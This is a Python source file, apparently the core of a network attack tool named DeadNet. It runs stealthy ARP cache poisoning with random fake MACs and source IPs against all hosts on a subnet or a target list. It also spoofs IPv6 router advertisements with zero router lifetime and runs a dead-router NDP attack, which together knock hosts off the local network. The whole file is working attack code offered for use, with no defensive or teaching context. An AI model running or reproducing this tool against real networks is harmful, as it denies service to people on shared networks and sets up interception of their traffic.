"""
DeadNet Attacker - Main attack orchestrator
"""

import time
import traceback
import threading
from concurrent.futures import ThreadPoolExecutor
from scapy.all import *

from .defines import *
from .misc_utils import *
from .network_utils import *


class DeadNetAttacker:
    """Main attack orchestrator with concurrent attack execution"""
    
    def __init__(self, iface, cidrlen, interval, gateway_ipv4, gateway_mac, 
                 disable_ipv6, ipv6_preflen, mode='local', fake_ip=None, 
                 target_ips=None, attack_state=None, attack_lock=None):
        self.network_interface = iface
        self.arp_poison_interval = interval
        self.ipv6_preflen = ipv6_preflen or IPV6_PREFLEN
        self.mode = mode
        
        self.attack_state = attack_state
        self.attack_lock = attack_lock
        
        self.fake_ip = fake_ip
        self.target_ips = target_ips
        
        conf.iface = self.network_interface
        self.cidrlen_ipv4 = cidrlen
        self.spoof_ipv6ra = not disable_ipv6
        
        self.user_ipv4 = get_if_addr(self.network_interface)
        self.subnet_ipv4 = self.user_ipv4.split(".")[:3]
        self.subnet_ipv4_sr = f"{'.'.join(self.subnet_ipv4)}.0/{self.cidrlen_ipv4}"
        
        self.gateway_ipv4 = gateway_ipv4 or get_gateway_ipv4(self.network_interface)
        if not self.gateway_ipv4:
            raise Exception(f"{RED}[!]{WHITE} Unable to detect gateway IPv4 address")
        
        self.gateway_mac = gateway_mac or get_gateway_mac(self.gateway_ipv4, self.network_interface)
        if not self.gateway_mac:
            raise Exception(f"{RED}[-]{WHITE} Unable to retrieve gateway MAC address")
        elif not is_valid_mac(self.gateway_mac):
            raise Exception(f"{RED}[-]{WHITE} Invalid gateway MAC address: {self.gateway_mac}")
        
        self.gateway_ipv6 = mac2ipv6_ll(self.gateway_mac, IPV6_LL_PREF)
        
        if self.target_ips:
            self.host_ipv4s = [ip.strip() for ip in self.target_ips if ip.strip()]
            self.log(f"{YELLOW}[!]{WHITE} TARGETED MODE: Attacking {len(self.host_ipv4s)} specific host(s)")
        else:
            exclude_ips = [self.user_ipv4, self.gateway_ipv4]
            self.host_ipv4s = generate_host_ips(self.subnet_ipv4_sr, exclude_ips)
            self.log(f"{BLUE}[*]{WHITE} FULL MODE: Generated {len(self.host_ipv4s)} possible IPv4 hosts")
        
        if self.spoof_ipv6ra:
            self.log(f"{BLUE}[*]{WHITE} IPv6 RA spoof is enabled")
        
        self.abort = False
        self.print_settings()
    
    def log(self, message):
        """Add log message to attack state"""
        if self.attack_lock and self.attack_state:
            with self.attack_lock:
                self.attack_state['logs'].append({
                    'timestamp': time.time(),
                    'message': message
                })
                if len(self.attack_state['logs']) > 100:
                    self.attack_state['logs'] = self.attack_state['logs'][-100:]
        print(message)
    
    def print_settings(self):
        """Display attack configuration"""
        self.log(DELIM)
        self.log("- Network Mode" + self.mode.upper().rjust(35))
        self.log("- Net Interface" + self.network_interface.rjust(35))
        self.log("- Sleep Interval" + str(self.arp_poison_interval).rjust(31) + " [sec]")
        self.log("- MAC Gateway" + self.gateway_mac.rjust(37))
        self.log("- IPv4 Subnet" + self.subnet_ipv4_sr.rjust(37))
        self.log("- IPv4 Gateway" + self.gateway_ipv4.rjust(36))
        self.log("- IPv6 Gateway" + self.gateway_ipv6.rjust(36))
        self.log("- Spoof IPv6 RA" + str(self.spoof_ipv6ra).rjust(35))
        if self.fake_ip:
            self.log("- Fake Source IP" + self.fake_ip.rjust(34))
        else:
            self.log("- Fake Source IP" + "Random (stealth)".rjust(34))
        self.log(DELIM)
    
    def generate_random_ip(self):
        """Generate random IP in subnet for stealth"""
        import random
        base = '.'.join(self.subnet_ipv4)
        return f"{base}.{random.randint(2, 250)}"
    
    def poison_arp_single_host(self, host_ip):
        """Poison ARP cache for a single host - targeted, not broadcast"""
        try:
            spoof_mac = RandMAC()
            # Always use fake IP for stealth - either user-specified or random
            source_ip = self.fake_ip if self.fake_ip else self.generate_random_ip()
            
            # Get target's MAC address first (required for targeted attack)
            target_mac = getmacbyip(host_ip)
            if not target_mac:
                # If can't get MAC, skip this host
                return 0
            
            # Packet 1: Tell gateway that target IP is at fake MAC
            # This poisons gateway's ARP cache
            arp_to_gateway = ARP(
                op=2,  # is-at (reply)
                psrc=host_ip,  # Pretend to be target
                hwsrc=spoof_mac,  # With fake MAC
                pdst=self.gateway_ipv4,
                hwdst=self.gateway_mac
            )
            sendp(Ether(dst=self.gateway_mac) / arp_to_gateway, 
                  iface=self.network_interface, verbose=0)
            
            # Packet 2: Tell target that gateway IP is at fake MAC
            # This poisons target's ARP cache - UNICAST to target only!
            arp_to_target = ARP(
                op=2,  # is-at (reply)
                psrc=self.gateway_ipv4,  # Pretend to be gateway
                hwsrc=spoof_mac,  # With fake MAC
                pdst=host_ip,
                hwdst=target_mac
            )
            sendp(Ether(dst=target_mac) / arp_to_target, 
                  iface=self.network_interface, verbose=0)
            
            return 2
        except Exception:
            return 0
    
    def poison_arp(self):
        """Execute ARP poisoning attack concurrently"""
        if self.attack_state and not self.attack_state['attacks_enabled']['arp_poison']:
            return 0
        
        packets_sent = 0
        with ThreadPoolExecutor(max_workers=20) as executor:
            results = executor.map(self.poison_arp_single_host, self.host_ipv4s)
            packets_sent = sum(results)
        
        return packets_sent
    
    def poison_ra(self):
        """Execute IPv6 RA poisoning attack"""
        if self.attack_state and not self.attack_state['attacks_enabled']['ipv6_ra']:
            return 0
        
        try:
            rand_mac = RandMAC()
            spoofed_mc_ra = (
                Ether(src=rand_mac) /
                IPv6(src=self.gateway_ipv6, dst=IPV6_MULTIC_ADDR) /
                ICMPv6ND_RA(chlim=255, routerlifetime=0, reachabletime=0) /
                ICMPv6NDOptSrcLLAddr(lladdr=rand_mac) /
                ICMPv6NDOptMTU() /
                ICMPv6NDOptPrefixInfo(prefixlen=self.ipv6_preflen, prefix=f"{IPV6_LL_PREF}::")
            )
            sendp(spoofed_mc_ra, iface=self.network_interface, verbose=0)
            return 1
        except Exception:
            return 0
    
    def dead_router_attack(self):
        """Monitor and kill default router advertisements"""
        if self.attack_state and not self.attack_state['attacks_enabled']['dead_router']:
            return
        
        try:
            NDP_Attack_Kill_Default_Router(iface=self.network_interface)
        except Exception as e:
            self.log(f"{RED}[!]{WHITE} Dead router attack error: {e}")
    
    def start_attack(self):
        """Main attack loop"""
        self.log(DELIM)
        self.log(f"{GREEN}[+]{WHITE} Attack started!")
        self.log(DELIM)
        
        if self.spoof_ipv6ra and self.attack_state and self.attack_state['attacks_enabled']['dead_router']:
            threading.Thread(target=self.dead_router_attack, daemon=True).start()
        
        if self.attack_lock and self.attack_state:
            with self.attack_lock:
                self.attack_state['statistics']['start_time'] = time.time()
        
        while not self.abort:
            try:
                cycle_start = get_ts_ms()
                packets_sent = 0
                
                with ThreadPoolExecutor(max_workers=3) as executor:
                    futures = []
                    futures.append(executor.submit(self.poison_arp))
                    
                    if self.spoof_ipv6ra:
                        futures.append(executor.submit(self.poison_ra))
                    
                    for future in futures:
                        try:
                            result = future.result(timeout=30)
                            packets_sent += result if result else 0
                        except Exception as e:
                            self.log(f"{RED}[!]{WHITE} Attack error: {e}")
                
                cycle_duration = get_ts_ms() - cycle_start
                
                if self.attack_lock and self.attack_state:
                    with self.attack_lock:
                        self.attack_state['statistics']['cycles'] += 1
                        self.attack_state['statistics']['packets_sent'] += packets_sent
                        self.attack_state['statistics']['last_cycle_duration'] = cycle_duration
                
                    self.log(
                        f"{GREEN}[+]{WHITE} Cycle #{self.attack_state['statistics']['cycles']} - "
                        f"{packets_sent} packets - {cycle_duration}ms"
                    )
                
                time.sleep(self.arp_poison_interval)
                
            except KeyboardInterrupt:
                self.stop()
                break
            except Exception as exc:
                self.log(f"{RED}[!]{WHITE} Exception: {exc}")
                self.log(traceback.format_exc())
                break
        
        self.log(f"{RED}[-]{WHITE} Attack stopped")
    
    def stop(self):
        """Stop the attack"""
        self.abort = True
